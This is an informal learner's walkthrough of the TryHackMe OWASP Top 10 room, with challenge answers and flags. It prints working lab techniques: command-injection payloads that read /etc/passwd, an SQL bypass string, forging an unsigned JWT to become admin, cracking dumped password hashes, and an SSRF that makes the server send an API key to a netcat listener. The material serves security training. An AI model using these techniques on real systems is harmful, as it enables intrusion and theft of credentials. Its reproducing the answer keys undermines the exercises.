1.Introduction

This room breaks each OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them.
You will put the theory into practice by completing supporting challenges.

    Broken Access Control
    Cryptographic Failures
    Injection
    Insecure Design
    Security Misconfiguration
    Vulnerable and Outdated Components
    Identification and Authentication Failures
    Software and Data Integrity Failures
    Security Logging & Monitoring Failures
    Server-Side Request Forgery (SSRF)

The room has been designed for beginners and assumes no previous security knowledge.

2.Accessing Machines

Start machine and connect your OpenVPN.

3.Broken Access Control

A regular visitor being able to access protected pages can lead to the following:

    Being able to view sensitive information from other users
    Accessing unauthorized functionality

Simply put, broken access control allows attackers to bypass authorisation, allowing them to view sensitive data or perform tasks 
they aren't supposed to.

4.Broken Access Control (IDOR Challenge)

Insecure direct object references (IDOR)

Log into the http://machine_ip with the noot and test1234 and change the id in the url to 0 and get the flag.

Answer:flag{fivefourthree}

5.Cryptographic Failures

The example here is emails:

When you are accessing your email account using your browser, you want to be sure that the communications between you and the
server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of 
your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as encrypting 
data in transit.
Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read 
their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as 
encrypting data at rest.

At more complex levels, taking advantage of some cryptographic failures often involves techniques such as 
"Man in The Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would 
take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted 
in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be 
exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web 
server itself.

6.Cryptographic Failures (Supporting Material 1)

Here we assume we already got into a system and found a database that we can look into and we downloaded to oru system.
To access it, we use sqlite3 <database-name>
From here, we can see the tables in the database by using the .tables command

At this point, we can dump all the data from the table, but we won't necessarily know what each column means unless we look at 
the table information. 
First, let's use PRAGMA table_info(customers); to see the table information. 
Then we'll use SELECT * FROM customers; to dump the information from the table

We can see from the table information that there are four columns: custID, custName, creditCard and password. 
You may notice that this matches up with the results.

0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99

We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash 
(5f4dcc3b5aa765d61d8327deb882cf99).

7.Cryptographic Failures (Supporting Material 2)

We can use https://crackstation.net/  to crack the hash or we can use john.

The result is password.

8.Cryptographic Failures (Challenge)

We use the steps of the previous rooms we learned.
We have the info that there is a website on the machine_ip:81

I looked up the website and first did not find the hidden directory,then i decided to use dirbuster with the directory-list-1.0.txt
and i did find /assets then i looked the hint and realized i watched the source code of the website but not of the login page.
Then i looked up what i could find under http://x.x.x.x:81/assets we have a webapp.db that we can download and then we can access
it with sqlite3 and the steps before mentioned.

First i used sqlite3 webapp.db,then i used .tables

with PRAGMA table_info(users); i got the info what the values mean like:

0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0

with SELECT * FROM users; i got the following
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0

6eea9b7ef19179a06954edd0f6c05ceb this is the hash of the admin password that we can put into crackstation.

qwertyuiop is the cracked password.

Then login with admin and qwertyuiop and you can see the flag.

Answer:/assets,webapp.db,6eea9b7ef19179a06954edd0f6c05ceb,qwertyuiop,THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

9.Injection 

SQL Injection: This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries 
to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in 
a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such 
as personal details and credentials.

Command Injection: This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary 
system commands on application servers, potentially allowing them to access users' systems.

The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.
There are different ways of doing this:

Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the 
input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
Stripping input: If the input contains dangerous characters, these are removed before processing.

10.Command Injection

Read the text and use the $() commands to get informations

Show us the current directory.
$(ls)

We can list the users.
$(cat /etc/passwd)
With this command we see also the users shell stat.

We see as which user we are logged in.
$(whoami)

We can check the linux alpine version.
$(cat /etc/alpine-release)

Had to look up the /sbin/nologin because i didnt understand at first user shell stat meant.
When they would write start directory/home directory i probably would get it easier(i hope im correct else make a pull to correct
me)

my source:
https://medium.com/@corybantic/tryhackme-owasp-top-10-2021-writeup-159ccfadb4d7

Answer:drpepper.txt,0,apache,/sbin/nologin,3.16.0

11.Insecure Design

I clicked forgot my password and then choose the question with the colors since they are way easier to guess.

green is the answer and our password got reset to FwXNtTPyM3Q6G2 (dont know if it changes when i would reset again)
Then i logged in and looked through the files.Funny cat pictures.

Answer:THM{Not_3ven_c4tz_c0uld_sav3_U!}

12.Security Misconfiguration

Kinda weird this one but yeah we used the console with the following command.
import os; print(os.popen("ls -l").read())

I guess we imported the ls -l command and then it displays us the directory.

Use the following command and read through the python file.
import os; print(os.popen("cat app.py").read())


Answers:todo.db,THM{Just_a_tiny_misconfiguration}

13.Vulnerable and Outdated Components

Under this link you can check the WordPress a website is using.
https://wpscan.com/#solutions

under this link we can find exploits
https://www.exploit-db.com/

14.Vulnerable and Outdated Components - Exploit

Explains us how to exploit a vuln program like in this case nostromo 1.9.6.
Kinda similiar to metasploit where we have to give arguments and so on to make a workin payload.

15.Vulnerable and Outdated Components - Lab

You can bypass the admin authentication with '1'='1 
https://www.exploit-db.com/exploits/48960

Couldnt find the exploit on exploit-db so i used the walktrough.
https://medium.com/@corybantic/tryhackme-owasp-top-10-2021-writeup-159ccfadb4d7

Answer:THM{But_1ts_n0t_myf4ult!}

16.Identification and Authentication Failures

Brute force attacks,weak credentials,session cookies values.Everything that makes getting into a system easy.

17.Identification and Authentication Failures Practical

I dont like the example here it kinda doesnt display what was meant before.
We go onto the website http://machine_ip:8088 and reregister " darren" and " arthur".Use one spacebar then write darren or arthur.

Answer:fe86079416a21a3c99937fea8874b667,d9ac0f7db4fda460ac3edeb75d75e16e

18.Software and Data Integrity Failures

We can check hashes of programs with md5sum,sha1sum,sha256sum and so on to know if the file got modified while it was transmitted.
Here the example is WinSCP-5.21.5-Setup.exe on the sourceforge website you can see the md5 checksum as example.

19.Software Integrity Failures

Enter this on the website and change it to sha256, https://code.jquery.com/jquery-1.12.4.min.js
https://www.srihash.org/

Then you get the sha256 and you can copy it to the answer.

Answer:sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=

20.Data Integrity Failures

Login as guest with password guest.

Then press F12 and look under Storage and then Cookies.The first answer is jwt-session.Copy the value you see under the link
https://appdevtools.com/base64-encoder-decoder

Remove the last signature part .xxxxxxxxx and then you gonna see the decoded stuff open a second site with the base64 
decoder/encoder and modify the alg value to none and the username to admin and encode it.
Encode it seperatly and add . between them and leave the signature out.

{"typ":"JWT","alg":"none"}
{"username":"admin","exp":xxxxxxxxxxxxxxx}

Answers:jwt-session,THM{Dont_take_cookies_from_strangers}

21.Security Logging and Monitoring Failures

Read the log file that u should download.

The ip is in the log and brute force i guessed because he is going through the common names of a system.

Answers:49.99.13.16,brute force

22.Server-Side Request Forgery (SSRF)

Look into the website http://machine_ip:8087 top right corner then admin area.

Hover over the Download Resumee button and read the link.

prepare a listner with 8087
nc -lvp 8087

In the browser we use this link with our ip (in this case the openvpn ip)
http://10.10.216.175:8087/download?server=your_ip:8087&id=75482342

Answers:localhost,secure-file-storage.com,THM{Hello_Im_just_an_API_key}

I skipped the additional flag since i have no idea what to do.Missing knowledge.

23.Whats Next?

Continue the paths.

